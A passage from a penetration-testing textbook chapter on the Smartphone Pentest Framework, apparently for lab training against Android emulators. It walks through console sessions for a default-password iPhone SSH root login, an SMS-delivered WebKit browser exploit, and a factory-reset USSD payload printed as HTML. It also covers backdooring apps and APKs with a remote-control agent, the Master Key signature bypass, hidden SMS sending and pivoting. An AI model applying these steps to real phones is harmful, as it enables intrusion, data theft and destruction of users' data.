/root/Smartphone-Pentest-Framework/nmap-5.61TEST4\n#EXPLOITS LOCATION\nEXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits\nListing 20-1: SPF config file\nThe default should meet your needs if your Kali IP address is 192.168.20.9\nand you installed SPF in /root/Smartphone-Pentest-Framework/. Otherwise, change\nthe IPADDRESS u and SHELLIPADDRESS v to your Kali machine’s IP address. Now run SPF by changing the directory to /root/Smartphone-Pentest\n-Framework/frameworkconsole/ and running ./framework.py. You should be\npresented with a menu similar to Listing 20-2. root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# ./framework.py\n################################################\n# #\n# Welcome to the Smartphone Pentest Framework! #\n# v0.2.6 #\n# Georgia Weidman/Bulb Security #\n# #\n################################################\nSelect An Option from the Menu:\n1.) Attach Framework to a Deployed Agent/Create Agent\n2.) Send Commands to an Agent\n3.) View Information Gathered\n4.) Attach Framework to a Mobile Modem\n5.) Run a remote attack\n6.) Run a social engineering or client side attack\n7.) Clear/Create Database\n8.) Use Metasploit\n9.) Compile code to run on mobile devices\n10.) Install Stuff\n11.) Use Drozer\n0.) Exit\nspf>\nListing 20-2: Starting SPF\nWe will spend the rest of the chapter exploring SPF’s various options. For now, let’s run a quick test to make sure that SPF can communicate with\nthe database. The SPF installer set up an empty database for SPF, but you\n448 Chapter 20\ncan clear out all your data and start fresh by running option 7.) Clear/Create\nDatabase, as shown here. This command will clear the SPF database tables\nand create them if they do not already exist. spf> 7\nThis will destroy all your data. Are you sure you want to? (y/N)? y\nAndroid Emulators\nIn Chapter 1, we created three Android emulators.\n\nThough some of our\nattacks will work regardless of the Android version, we’ll look at certain\nclient-side and privilege-escalation attacks that work well on emulators\nthat target these specific older versions. Because they’re only emulators, you\nwon’t be able to successfully test all known Android exploits against your\nAndroid emulators. Attaching a Mobile Modem\nBecause not all mobile attack vectors use the TCP/IP network, SPF piggy-\nbacks on the pentester’s devices. As of this writing, SPF can use the mobile\nmodem of an Android phone with the SPF app installed or USB modem\nwith a SIM card to send SMS messages. Additionally, when using an Android\nphone with NFC capability, SPF can deliver payloads via Android Beam and\nthe SPF Android App. Building the Android App\nTo build the Android app from SPF, choose option 4.) Attach Framework to a\nMobile Modem, as shown in Listing 20-3. spf> 4\nChoose a type of modem to attach to:\n1.) Search for attached modem\n2.) Attach to a smartphone based app\n3.) Generate smartphone based app\n4.) Copy App to Webserver\n5.) Install App via ADB\nspf> 3u\nChoose a type of control app to generate:\n1.) Android App (Android 1.6)\n2.) Android App with NFC (Android 4.0 and NFC enabled device)\nspf> 1v\nPhone number of agent: 15555215556w\nControl key for the agent: KEYKEY1x\nWebserver control path for agent: /androidagent1y\nUsing the Smartphone Pentest Framework 449\nControl Number:15555215556\nControl Key:KEYKEY1\nControlPath:/bookspf\nIs this correct?(y/n)y\n--snip--\n-post-build:\ndebug:\n\nBUILD SUCCESSFUL\nTotal time: 10 seconds\nListing 20-3: Building the SPF app\nNext select option 3.) Generate smartphone based app u. SPF can make two\nkinds of apps: one that uses NFC, and one that does not. Because our Android\nemulator lacks NFC capabilities, choose 1.) Android App (Android 1.6) v. You’ll be asked to enter information about an SPF agent to control\nvia the SPF app. SPF agents allow us to control an infected mobile device. We’ll look at generating and deploying SPF agents later in the chapter; for\nnow, just enter the phone number of your Android 2.2 emulator w, a seven-\ncharacter key x, and a path on the web server starting with / y. SPF will\nthen use the Android SDK to build the SPF app. Deploying the App\nNow to deploy the app on our Android 4.3 emulator. This emulator will\nsimulate the pentester-controlled device, and the other two emulators will\nbe our targets. If you’re running your emulators on Kali Linux or using real\nAndroid devices that you can attach via USB to your Kali virtual machine,\nyou can use Android Debug Bridge (ADB) to install the app, as shown in\nListing 20-4. (First, choose option 4.) Attach Framework to a Mobile Modem\nfrom the main menu.)\nspf> 4\nChoose a type of modem to attach to:\n1.) Search for attached modem\n2.) Attach to a smartphone based app\n3.) Generate smartphone based app\n4.) Copy App to Webserver\n5.) Install App via ADB\nspf> 5\n* daemon not running. starting it now on port 5037 *\n* daemon started successfully *\nList of devices attached\nemulator-5554 device\nemulator-5556 device\nemulator-5558 device\n450 Chapter 20\nChoose a device to install on: emulator-5554u\nWhich App? 1.)Framework Android App with NFC\n2.)Framework Android App without NFC\nspf> 2v\n1463 KB/s (46775 bytes in 0.031s)\npkg: /data/local/tmp/FrameworkAndroidApp.apk\nSuccess\nListing 20-4: Installing the SPF app\nFrom the Choose a type of modem to attach to menu, select option 5\nto have ADB search for all attached devices. Next, tell SPF which emulator\nor device to install SPF on; in this example I’ve chosen emulator-5554 u, the\nAndroid 4.3 emulator with phone number 1-555-521-5554. Finally, tell SPF\nto install the Android app without NFC (option 2) v. If you’re using emulators on your host system, ADB from Kali will not be\nable to attach to them. Instead, to deploy the app, choose option 4.) Attach\nFramework to a Mobile Modem from the main menu and then choose option\n4.) Copy App to Webserver, as shown in Listing 20-5. spf> 4\nChoose a type of modem to attach to:\n1.) Search for attached modem\n2.) Attach to a smartphone based app\n3.) Generate smartphone based app\n4.) Copy App to Webserver\n5.) Install App via ADB\nspf> 4\nWhich App? 1.)Framework Android App with NFC\n2.)Framework Android App without NFC\nspf> 2u\nHosting Path: /bookspf2v\nFilename: /app.apkw\nListing 20-5: Copy app to web server\nThis will allow us to copy the app to Kali’s web server, where we can\ndownload and install it to the emulator. Tell SPF to copy the Framework\nAndroid App without NFC u, and then tell it where to put the app on the\nweb server v. Finally, tell SPF the filename for the app to be downloaded w. Download the app from your Android 4.3 emulator by opening the URL\nhttp://192.168.20.9/bookspf2/app.apk in the mobile browser. Using the Smartphone Pentest Framework 451\nAttaching the SPF Server and App\nNow we need to attach the SPF server and the SPF app, as shown in\nListing 20-6. (Again, begin with option 4 in the main menu.)\nspf> 4\nChoose a type of modem to attach to:\n1.) Search for attached modem\n2.) Attach to a smartphone based app\n3.) Generate smartphone based app\n4.) Copy App to Webserver\n5.) Install App via ADB\nspf> 2u\nConnect to a smartphone management app. You will need to supply the phone\nnumber, the control key, and the URL path. Phone Number: 15555215554v\nControl Key: KEYKEY1w\nApp URL Path: /bookappx\nPhone Number: 15555215554\nControl Key: KEYKEY1\nURL Path: /bookapp\nIs this correct?(y/N): y\nListing 20-6: Attaching to SPF app\nChoose 2.) Attach to a smartphone\nbased app u. Next, give SPF the phone\nnumber of the emulator running the SPF\napp v, a seven-character key w, and the\nURL where the app will check in x. (The\nkey does not need to be the same one we\nused for the agent when building the app. Also the URL should be different from the\none used for the agent when building the\napp.) Once you’ve confirmed that this\ninformation is correct, SPF will appear to\nhang. We need to attach the app. To attach the app, first open it on the\nAndroid emulator. The main screen asks\nfor the IP address of the SPF server, the\nURL to check in, and the seven-character\nkey. Use the same values as in the previ-\nous step (except the IP address should be\nthe IP address of the SPF server rather\nFigure 20-1: SPF app\nthan the phone number), as shown in\nFigure 20-1. 452 Chapter 20\nAfter you’ve filled out the information, click Attach on the app. You\nwill now be able to control the phone from SPF until you click Detach. Now\nreturn to SPF on Kali. When the app is attached, you are dropped back\nto the main SPF menu, which means we’re ready to start running mobile\nattacks. remote attacks\nIn the history of mobile devices, there have been attacks on the mobile\nmodem and other externally facing interfaces. For example, researchers\nfound vulnerabilities in the mobile modem drivers for both Android phones\nand the iPhone that allowed attackers to crash the phone, take it off the\nmobile network, or even gain command execution on it, just by sending an\nSMS message. Like traditional computers, as the security position of mobile\ndevices improves, the number of available remote attacks will decrease. That said, the more software users install on their phones, the greater the\nchance that there’s a potentially vulnerable service listening on a network\nport, as you’ll learn in the following sections. Default iPhone SSH Login\nOne remote attack was perhaps the cause of the first iPhone botnet. On\njailbroken iPhones, users can install SSH to log in to their iPhone termi-\nnals remotely. By default, SSH has the root password alpine on all devices. Of course, users should change this value, but many who jailbreak their\niPhones do not. Though this issue came to light years ago, as with many\ndefault password issues, it continues to pop up. To test for this default SSH password on a jailbroken iPhone, we could\nchoose 5.) Run a Remote Attack, or use our old friend, Metasploit. Much as\nSET allowed us to create client-side attacks in Metasploit in Chapter 11, we\ncan use SPF to interface with Msfcli to automate running mobile modules\nfrom Metasploit. Unfortunately, as of this writing, not much in Metasploit targets mobile\ndevices, but one module does test for use of the default iPhone password. As\nshown in Listing 20-7, from the main SPF menu choose 8.) Use Metasploit,\nand then choose 1.) Run iPhone Metasploit Modules. Next, choose 1.) Cydia\nDefault SSH Password. SPF will ask you for the IP address of the iPhone in\norder to fill in the RHOST option in the module. SPF will then call Msfcli and\nrun the desired module. spf> 8\nRuns smartphonecentric Metasploit modules for you. Select An Option from the Menu:\n1.) Run iPhone Metasploit Modules\n2.) Create Android Meterpreter\n3.) Setup Metasploit Listener\nspf> 1\nUsing the Smartphone Pentest Framework 453\nSelect An Exploit:\n1.) Cydia Default SSH Password\n2.) Email LibTiff iOS 1\n3.) MobileSafari LibTiff iOS 1\nspf> 1\nLogs in with alpine on a jailbroken iPhone with SSH enabled. iPhone IP address: 192.168.20.13\n[*] Initializing modules... RHOST => 192.168.20.13\n[*] 192.168.20.13:22 - Attempt to login as 'root' with password 'alpine'\n[+] 192.168.20.13:22 - Login Successful with 'root:alpine'\n[*] Found shell. [*] Command shell session 1 opened (192.168.20.9:39177 -> 192.168.20.13:22) at\n2015-03-21 14:02:44 -0400\nls\nDocuments\nLibrary\nMedia\n--snip--\nListing 20-7: Root SSH default password Metasploit module\nIf you have a jailbroken iPhone handy, you can test this module. Metasploit\nwill present you with a root shell if the login succeeds. When you are finished,\ntype exit to close the shell and return to SPF. Of course, if you have SSH on\nyour iPhone, be sure to change the password from alpine right away. Client-side attacks\nWith mobile devices, client-side attacks are more prevalent than remote attacks. And as with the attacks we studied in Chapter 10, our client-side attacks are\nnot restricted to the mobile browser. We can attack other default apps on\nthe device as well as any third-party apps that may have bugs. Client-Side Shell\nLet’s look at an example of attacking the WebKit package in the mobile\nbrowser to gain a shell on an Android device. (This is similar to the browser\nattacks discussed in Chapter 10.) We’ll attack a flaw in the mobile browser\nafter enticing the user into opening a malicious page. The executed shell-\ncode will be for Android, not Windows, but the overall attack dynamics are\nthe same, as shown in Listing 20-8. spf> 6\nChoose a social engineering or client side attack to launch:\n1.) Direct Download Agent\n2.) Client Side Shell\n3.) USSD Webpage Attack (Safe)\n4 ) USSD Webpage Attack (Malicious)\n454 Chapter 20\nspf> 2u\nSelect a Client Side Attack to Run\n1) CVE=2010-1759 Webkit Vuln Android\nspf> 1v\nHosting Path: /spfbook2w\nFilename: /book.htmlx\nDelivery Method(SMS or NFC): SMSy\nPhone Number to Attack: 15555215558\nCustom text(y/N)? N\nListing 20-8: Android browser attack\nFrom the main SPF menu choose 6.) Run a social engineering or client\nside attack. Now choose 2.) Client Side Shell u then exploit option 1.)\nCVE=2010-1759 Webkit Vuln Android v. You will be prompted for the path on\nthe web server w and asked for a filename x. SPF will then generate a mali-\ncious page to attack the CVE-2010-1759 WebKit vulnerability. You will then be asked how you want to deliver a link to the malicious\npage y. You can use either NFC or SMS. Because our emulator does not\nsupport NFC, we choose SMS. When prompted for the number to attack,\nsend the SMS to your Android 2.1 emulator. Finally, when asked if you want\nto use custom text for the SMS (rather than the default “This is a cool page:\n<link>”), change the default to something more creative, or not. We have only one mobile modem attached to SPF, so SPF automati-\ncally uses it to send the SMS message. SPF contacts our SPF app on the\nAndroid 4.3 emulator and instructs it to send a text message to the\nAndroid 2.1 emulator. The SMS received by the Android 2.1 emulator\nwill be from the Android 4.3 emulator. (Some mobile devices, such as\niPhones, have a flaw in how they implement SMS that allows attackers to\nspoof the sender number to make it look like this attack came from any\nnumber they’d like.) The message received is shown here.\n\n15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html\nLike the client-side attacks discussed in Chapter 10, this attack relies on\nthe user opening the link in a vulnerable mobile browser. Our Android 2.1\nemulator browser is vulnerable to the attack, and when you click the link\nto open the mobile browser, the browser will attempt to open the page for\n30 seconds or so as the attack is running, before crashing. At that point,\nyou should have a shell waiting for you in SPF. SPF automatically runs the\nAndroid equivalent of whoami when the shell opens. Because we attacked the browser, we’re running as app_2, the mobile\nbrowser on our emulator. As usual, the shell has all the permissions of the\nexploited app, meaning that you can run any commands available to the\nbrowser. For example, enter /system/bin/ls, as shown in Listing 20-9, to use\nls to list the contents of the current directory. When you’ve finished, enter\nexit to return to SPF. Using the Smartphone Pentest Framework 455\nConnected: Try exit to quit\nuid=10002(app_2) gid=10002(app_2) groups=1015(sdcard_rw),3003(inet)\n/system/bin/ls\nsqlite_stmt_journals\n--snip--\nexit\nListing 20-9: Android shell\nnote Android is a forked Linux kernel, so once we have a shell, we should be ready to\ngo with Android, right? Unfortunately, many Linux utilities like cp aren’t there. Additionally, the user structure is a bit different, with each app having its own UID. A deep dive into Android, however, is beyond the scope of this chapter. We’ll look at an alternative way to control exploited Android devices,\nusing backdoored apps to call Android APIs, later in this chapter. But first\nlet’s look at another client-side attack. USSD Remote Control\nUnstructured Supplementary Service Data (USSD) is a way for mobile devices to\ncommunicate with the mobile network. When you dial specific numbers,\nthe device will perform certain functions. In late 2012, it came to light that some Android devices would automati-\ncally open a number they discovered on a web page in the dialer application. When USSD codes are entered in the dialer, the functionality is automati-\ncally called. That sounds like a great function for attackers to abuse to con-\ntrol a device remotely. As it turned out, attackers could put USSD codes in a web page as the\nnumber to dial and end up forcing these vulnerable devices to do all sorts\nof interesting things. For example, as shown here, the tel: tag in a mali-\ncious web page tells Android this is a phone number. But when the USSD\ncode 2673855%23 is opened in the dialer, the device performs a factory\nrestore, deleting all the user’s data. <html>\n<frameset>\n<frame src=\"tel:*2767*3855%23\" />\n</frameset>\n</html>\nnote The vulnerability is not in the USSD code itself, but in certain devices’ implementa-\ntion of the tel: tag. Various USSD tags offer all sorts of functionality. Our example will use a more innocuous payload than the one described\npreviously. We’ll have our device automatically dial a code to present its\nunique identifier in a pop-up, as shown in Listing 20-10. 456 Chapter 20\nspf> 6\nChoose a social engineering or client side attack to launch:\n1.) Direct Download Agent\n2.) Client Side Shell\n3.) USSD Webpage Attack (Safe)\n4 ) USSD Webpage Attack (Malicious)\nspf> 3u\nHosting Path: /spfbook2\nFilename: /book2.html\nPhone Number to Attack: 15555215558\nListing 20-10: Android USSD attack\nTo run the safe USSD example in SPF, choose menu option 6, then\n3.) USSD Webpage Attack (Safe) u. You’ll be asked for the location of the web\nserver, the name of the malicious page, and the phone number to text it to. Send it to your Android 2.1 emulator. Now open the page in the SMS you receive on the Android 2.1 emula-\ntor. This time, instead of crashing the browser, the dialer app opens, and a\npop-up notification appears, as shown in Figure 20-2. Figure 20-2: USSD autodial\nAs it turns out, our emulator has no unique identifier, so the number is\nblank. Though this example was not harmful to the device or its data, other\nUSSD codes can be if they are opened in the dialer. Using the Smartphone Pentest Framework 457\nnote Of course, this vulnerability, as well as the WebKit issue we exploited in the previous\nsection, has been patched since its discovery. Android has a complicated relationship\nwith security updates. The problem is that anyone can make an Android device with\nits own implementation of the Android OS. When Google releases a new version\nwith a set of patches, every original equipment manufacturer (OEM) needs to port\nthe changes to its version of Android, and the carriers need to push updates to their\ndevices. However, updates are not delivered consistently, which means that millions\nof unpatched devices may be in use, depending on the model and the carrier. Now let’s turn our attention to a vulnerability that will probably never\nbe patched: malicious applications. malicious apps\nWe’ve studied malicious programs intermittently throughout this book. We\ncreated malicious executables with Msfvenom in Chapter 4, uploaded back-\ndoors to vulnerable web servers in Chapter 8, looked at social-engineering\nattacks to trick users into downloading and running malicious programs in\nChapter 11, and bypassed antivirus programs in Chapter 12. While social engineering and users undermining security policies\nby running malicious programs will likely be major issues for enterprise\nsecurity for years to come, mobile devices make this issue even more com-\nplicated. It’s hard to imagine anyone giving you a laptop computer for work\nand encouraging you to go out to the Internet and download every poten-\ntially interesting, fun, or productivity-increasing program you can find—\nbut that’s exactly how mobile devices are marketed. (“Buy our device. It has\nthe best apps.” “Download our apps. They’re the best in productivity/enter-\ntainment/security.”) Mobile antivirus applications often require extreme\npermissions and even administrative functions on the device in order to\nrun, and mobile device management solutions typically require installing\neven more applications on the device. Mobile users are inundated with reasons to download apps to their\ndevices, and mobile malware is on the rise, much of it in the form of mali-\ncious applications. If a user can be tricked into installing a malicious app,\nthe attacker can utilize Android’s APIs to steal data, gain remote control,\nand even attack other devices. In the Android security model, apps must request permissions to use\nAPIs that could be used maliciously, and users must accept the requested\npermissions at installation. Unfortunately, users often grant access to all\nsorts of potentially dangerous permissions. We can use Android permis-\nsions to control the device without running an additional exploit after the\nuser installs the malicious app. 458 Chapter 20\nCreating Malicious SPF Agents\nSPF allows us to create a malicious app with a variety of interesting func-\ntionality. Earlier we used the SPF app on our pentester-controlled device to\nallow SPF to use the device’s mobile modem and other functionality; our\ngoal here is to trick users into installing the SPF agent on target devices. As of this writing, SPF agents can receive commands by checking in to a\nweb server over HTTP or via hidden SMS messages from an SPF-controlled\nmobile modem. Naturally, we’ll be more successful if our agent appears to be\nan interesting and/or trustworthy app. We can embed the agent inside any\nlegitimate app: SPF can take a compiled APK file and backdoor it with the\nagent, or if we have the source code of the app, we can backdoor that as well. Backdooring Source Code\nLet’s use backdooring source code for our example. Choose 1.) Attach\nFramework to a Deployed Agent/Create Agent at the main SPF menu. SPF\nincludes a couple of app templates that we can use for our example. You\ncan also import any app source code into SPF with option 4. If you don’t\nhave source code for the app you want to impersonate, you can use option 5\nto backdoor a compiled APK. You can even use the Android Master Key\nvulnerability discovered in 2013 to replace applications already installed\non the device with a backdoored version. For now, let’s just use one of SPF’s\ntemplates, as shown in Listing 20-11. spf> 1\nSelect An Option from the Menu:\n1.) Attach Framework to a Deployed Agent\n2.) Generate Agent App\n3.) Copy Agent to Web Server\n4.) Import an Agent Template\n5.) Backdoor Android APK with Agent\n6.) Create APK Signing Key\nspf> 2u\n1.) MapsDemo\n2.) BlankFrontEnd\nspf> 1v\nPhone number of the control modem for the agent: 15555215554w\nControl key for the agent: KEYKEY1x\nWebserver control path for agent: /androidagent1y\nControl Number:15555215554\nControl Key:KEYKEY1\nControlPath:/androidagent1\nIs this correct?(y/n) y\n--snip--\n\nBUILD SUCCESSFUL\nListing 20-11: Building the Android agent\nUsing the Smartphone Pentest Framework 459\nChoose 2.) Generate Agent App u. We’ll use the MapsDemo example\ntemplate v distributed with Android SDK by Google to demonstrate func-\ntionality. When prompted, give the phone number to send SMS commands\nto w, the SPF the seven-character key x, and the directory to check in for\nHTTP commands y. For the agent key and path, use the same values that\nyou used when you created the SPF app (“Building the Android App” on\npage 449). Use the Android 4.3 emulator (SPF app) phone number as\nthe control phone number. SPF will build the Android agent in the chosen\ntemplate. Now to entice the user into downloading and installing the agent, a\nprocess similar to our client-side attacks, following the steps in Listing 20-12. spf> 6\nChoose a social engineering or client side attack to launch:\n1.) Direct Download Agent\n2.) Client Side Shell\n3.) USSD Webpage Attack (Safe)\n4 ) USSD Webpage Attack (Malicious)\nspf> 1u\nThis module sends an SMS with a link to directly download and install an Agent\nDeliver Android Agent or Android Meterpreter (Agent/meterpreter:) Agentv\nHosting Path: /spfbook3w\nFilename: /maps.apk\nDelivery Method:(SMS or NFC): SMS\nPhone Number to Attack: 15555215556\nCustom text(y/N)? N\nListing 20-12: Enticing the user into installing the agent\nChoose option 6 at the main menu,\nand then choose 1.) Direct Download Agent\nu. You will be asked if you want to send the\nAndroid agent or Android Meterpreter (a\nrecent addition to Metasploit). Because we’re\nworking with the Android agent, choose Agent\nv. As usual, you are prompted for the path,\napp name on the web server, attack vector,\nand the number to attack, beginning at w. Instruct SPF to send an SMS with default\ntext to the Android 2.2 emulator. On the Android 2.2 emulator, click the\nlink in the SMS when it arrives. The app\nshould be downloaded. After it downloads,\nclick Install, accept the permissions, and\nopen the app. As shown in Figure 20-3, the\nagent will look and feel like the original app\ntemplate (the Google Maps demo), but it has\nFigure 20-3: Backdoored app\nsome extra functionality in the background. 460 Chapter 20\nNow to attach SPF to the deployed agent. If you send an SMS campaign\nto lots of numbers, who knows how many users will install the agent or how\nquickly, but the agent has check-in functionality (see Listing 20-13) that will\nrespond to SPF’s query to see if it is deployed. spf> 1\nSelect An Option from the Menu:\n1.) Attach Framework to a Deployed Agent\n2.) Generate Agent App\n3.) Copy Agent to Web Server\n4.) Import an Agent Template\n5.) Backdoor Android APK with Agent\n6.) Create APK Signing Key\nspf> 1u\nAttach to a Deployed Agent:\nThis will set up handlers to control an agent that has already been deployed. Agent URL Path: /androidagent1v\nAgent Control Key: KEYKEY1w\nCommunication Method(SMS/HTTP): HTTPx\nURL Path: /androidagent1\nControl Key: KEYKEY1\nCommunication Method(SMS/HTTP): HTTP\nIs this correct?(y/N): y\nListing 20-13: Attaching SPF to the deployed agent\nChoose option 1 at the main menu and then choose 1.) Attach Framework\nto a Deployed Agent u. You are prompted for the path v, key w, and commu-\nnication method x. Enter the values you used when creating the agent. SPF will appear to hang for a minute as it waits for the agent to respond. After it returns to the menu, you should be connected to the agent. Now\nchoose 2.) Send Commands to an Agent from the main menu. You will be pre-\nsented with a list of agents in the database; you should see the agent you just\nattached to SPF in the list as shown here. spf> 2\nAvailable Agents:\n15555215556\nBackdooring aPKs\nBefore we move on to using our deployed SPF agent, let’s look at another,\nperhaps more sophisticated, way of creating an agent. Because you may not\nalways have the source code of the app you want to backdoor, SPF can work\nwith the precompiled APK file. Any APK, including those in the Google\nPlay store, are in scope. Using the Smartphone Pentest Framework 461\nTo backdoor an APK with the SPF agent, choose 1 from the main menu,\nand then 5.) Backdoor Android APK with Agent, as shown in Listing 20-14. spf> 1\nSelect An Option from the Menu:\n1.) Attach Framework to a Deployed Agent\n2.) Generate Agent App\n3.) Copy Agent to Web Server\n4.) Import an Agent Template\n5.) Backdoor Android APK with Agent\n6.) Create APK Signing Key\nspf> 5\nAPKTool not found! Is it installed? Check your config file\nInstall Android APKTool(y/N)? spf> y\n--2015-12-04 12:28:21-- https://android-apktool.googlecode.com/files/apktool-\ninstall-linux-r05-ibot.tar.bz2\n--snip--\nPuts the Android Agent inside an Android App APK. The application runs\nnormally with extra functionality\nAPK to Backdoor: /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk\nI: Baksmaling... --snip--\nListing 20-14: Backdooring an APK\nSPF does not install the APKTool program, required to decompile\nAPKs, by default; it asks if you want to install it. Enter y, and SPF will install\nAPKTool and continue. When prompted, tell SPF to backdoor the APK /root/Smartphone-Pentest\n-Framework/APKs/MapsDemo.apk (a compiled version of the Google Maps\ndemo code used previously). SPF will then decompile the APK, combine it\nwith the SPF agent, and recompile it. To set up the agent, SPF needs to know the control phone number,\ncontrol key, and control path. This is the same information we used when\nbackdooring source code and is shown in Listing 20-15. Phone number of the control modem for the agent: 15555215554\nControl key for the agent: KEYKEY1\nWebserver control path for agent: /androidagent1\nControl Number: 15555215554\nControl Key:KEYKEY1\nControlPath:/androidagent1\nIs this correct?(y/n) y\n--snip--\nListing 20-15: Setting options\n462 Chapter 20\nAfter APKTool recompiles the backdoored APK, we need to sign it. At\ninstallation, the Android device checks the signatures on an APK. If it is not\nsigned, it will be rejected, even by an emulator. Google Play apps are signed\nusing a developer key registered with Google Play. To run apps on emulators and devices that are not restricted to Google\nPlay apps, we just use a debug key that is not registered with Google, but the\napp still must be signed. We were able to skip this step when backdooring\nsource code because we compiled the code with the Android SDK, which\nautomatically signed our code with the default Android keystore. Because\nwe used APKTool here, we need to manually re-create the signature. You will be asked whether you want to use the Android Master Key\nvulnerability, which allows attackers and pentesters to trick the Android\nsignature-verification process into thinking our app is a legitimate update\nto an already installed application. In other words, we will be allowed to\nreplace legitimate applications with our code, and the Android system will\nview them as legitimate updates from the vendor. (This flaw in the verifi-\ncation process was fixed in Android 4.2.) To use the Android Master Key\nvulnerability, enter y at the prompt, as shown next. note To leverage this issue, the original application and its signatures are copied into our\nbackdoored APK. Details about how this triggers the Master Key vulnerability can be\nfound here: http://www.saurik.com/id/17. Use Android Master Key Vuln?(y/N): y\nArchive: /root/Desktop/abcnews.apk\n--snip--\nInflating: unzipped/META-INF/CERT.RSA\nTo see the Android Master Key vulnerability at work, install the legiti-\nmate version of MapsDemo.apk from /root/Smartphone-Pentest-Framework/APKs\nonto a device running an Android version earlier than 4.2, and then try to\ninstall the backdoored version you just created by delivering it via SMS or\nNFC with SPF. You should be prompted to replace MapsDemo.apk, and the\nsignature verification should succeed, even though we didn’t have access\nto the private keys required to build a correct signature for our backdoored\nversion. If your target is not vulnerable to Master Key or the app is not already\non the target device, you can just sign the app with your default key for the\nAndroid keystore on Kali. To do this, enter n at the prompt for Use Android\nMaster Key Vuln, as shown in Listing 20-16. Use Android Master Key Vuln?(y/N): n\nPassword for Debug Keystore is android\nEnter Passphrase for keystore:\n--snip--\nsigning: resources.arsc\nListing 20-16: Signing the APK\nUsing the Smartphone Pentest Framework 463\nYou are prompted for the password for the debug keystore. By default,\nthis action does not sign the APK with a key for publishing it on Google\nPlay, but it will work for our purposes. The app is now signed with a debug\nkey and should install on any device that does not restrict apps to official\nPlay Store apps. Note that there’s nothing stopping a pentester from signing\nthe app with a legitimate Google Play key they have registered if it’s in the\nscope of the pentest to attempt to trick users into downloading malicious\napps from the Google Play store. note The backdoored APK is functionality equivalent to the agent we created in “Backdooring\nSource Code” on page 459 and can be deployed the same way. Of course, we already\nhave a deployed agent to work with as we look at what we can do to a device and its\nlocal network after an agent is deployed. mobile Post exploitation\nNow that we’re on the device, we have a few options open to us. We can\ngather local information from the device such as contacts or received SMS\nmessages, and we can remotely control the device to have it do things like\ntake a picture. If we’re unsatisfied with our permissions, we can attempt\nto perform privilege escalation on the device and get root privileges. We\ncan even use the exploited mobile device to attack other devices on the\nnetwork. (This attack can be particularly interesting if the device connects\ndirectly to a corporate network or uses a VPN to access one.)\nInformation Gathering\nWe will run an example of information gathering by getting a list of\ninstalled applications on the infected device as shown in Listing 20-17. spf> 2\nView Data Gathered from a Deployed Agent:\nAvailable Agents:\n1.) 15555215556\nSelect an agent to interact with or 0 to return to the previous menu. spf> 1u\nCommands:v\n1.) Send SMS\n2.) Take Picture\n3.) Get Contacts\n4.) Get SMS Database\n5.) Privilege Escalation\n6.) Download File\n7.) Execute Command\n8.) Upload File\n9.) Ping Sweep\n10.) TCP Listener\n11.) Connect to Listener\n12.) Run Nmap\n464 Chapter 20\n13.) Execute Command and Upload Results\n14.) Get Installed Apps List\n15.) Remove Locks (Android < 4.4)\n16.) Upload APK\n17.) Get Wifi IP Address\nSelect a command to perform or 0 to return to the previous menu\nspf> 14w\nGets a list of installed packages(apps) and uploads to a file. Delivery Method(SMS or HTTP): HTTPx\nListing 20-17: Running a command on an agent\nChoose option 2 from the main menu, then select the agent from the\nlist u. When presented with a list of available agent functionality v, choose\n14.) Get Installed Apps List w. SPF asks how you would like to deliver the\ncommand; we’ll use HTTP x. (Recall that agents can communicate and\nreceive commands via HTTP and SMS.)\nEnter 0 to return to the previous menu until you reach the main menu. Wait a minute, and then choose 3.) View Information Gathered, as shown in\nListing 20-18. spf> 3\nView Data Gathered from a Deployed Agent:\nAgents or Attacks? Agentsu\nAvailable Agents:\n1.) 15555215556\nSelect an agent to interact with or 0 to return to the previous menu.\n\nspf> 1v\nData:\nSMS Database:\nContacts:\nPicture Location:\nRooted:\nPing Sweep:\nFile:\nPackages: package:com.google.android.locationw\n--snip--\npackage:com.android.providers.downloads\npackage:com.android.server.vpn\nListing 20-18: Viewing gathered data\nYou are asked if you want to see the results of Attacks or Agents; type\nAgents u. Choose our agent v. Information about the device is pulled from\nthe database, though currently all we have is a list of installed apps, gathered\nby the previous command w. (You can run additional information-gather-\ning commands to fill in more entries.)\nRemote Control\nNow let’s see how to use the agent to remotely control the device. We can tell\nthe device to send a text message that will not show up in the sent messages\nof the SMS app. In fact, the user will have no indication that a message\nUsing the Smartphone Pentest Framework 465\nwas sent at all—what better way to exploit the circle of trust? Perhaps we\ncan grab all the user’s contacts and send them messages telling them they\nshould install our cool app, which just so happens to point to the SPF agent. Because the message comes from someone they know, the users will be more\nlikely to install the agent. Let’s just send an example message for now, as shown in Listing 20-19. Commands:\n--snip--\nSelect a command to perform or 0 to return to the previous menu\nspf> 1u\nSend an SMS message to another phone. Fill in the number, the message to send,\nand the delivery method(SMS or HTTP). Number: 15555215558\nMessage: hiya Georgia\nDelivery Method(SMS or HTTP) SMS\nListing 20-19: Remotely controlling an agent\nFrom the agent commands menu, select option 1.) Send SMS u. When\nprompted for a phone number, message contents, and how you want to\ndeliver the command, tell your agent to send the message to the Android 2.1\nemulator. Your Android 2.1 emulator will receive an SMS with the text you entered\nfrom the Android 2.2 emulator, with no indication on either emulator that\nthis is not a normal message. Pivoting Through Mobile Devices\nMobile Device Management (MDM) and mobile antivirus applications have\na long way to go. The number of companies that mandate these solutions\nfor their employees is still small when compared with many other security\ncontrols, and some companies choose not to allow mobile devices at all. But let’s face it: Employees probably know the company’s wireless pass-\nword. Connect your mobile device, and magically it’s a member of the same\nnetwork as your workstation and other devices that might contain sensitive\ninformation. Naturally, companies are much better at hardening their externally\nfacing assets. After all, these devices are open to attack from anyone on\nthe Internet, and they get the lion’s share of the attention. But internally,\nthings start to break down. Weak passwords, missing patches, and out-of-date\nclient-side software are all issues we’ve examined in this book that could be\nlurking in the internal network. If an exploited mobile device has direct\nnetwork access to these vulnerable systems, we may be able to use it as a\npivot to launch additional attacks, completely bypassing the perimeter. We studied pivoting in Chapter 13, when we used an exploited machine\nto move from one network to another. We can do the same thing here\nusing the SPF agent, effectively running a pentest on the mobile network\nthrough the exploited mobile device, as illustrated in Figure 20-4. 466 Chapter 20\nattacker\nInternet\nlocal router\nlocal infected\nphone local PC\nFigure 20-4: Pivoting through an infected\nmobile device to attack internal devices\nPortscanning with Nmap\nWe start by seeing what devices are out there using an agent command option\nto ping sweep the local network. Next, we’ll do some port scanning, as dis-\ncussed in Chapter 5. As it turns out you can install Nmap Android binaries\non the exploited device. SPF has install 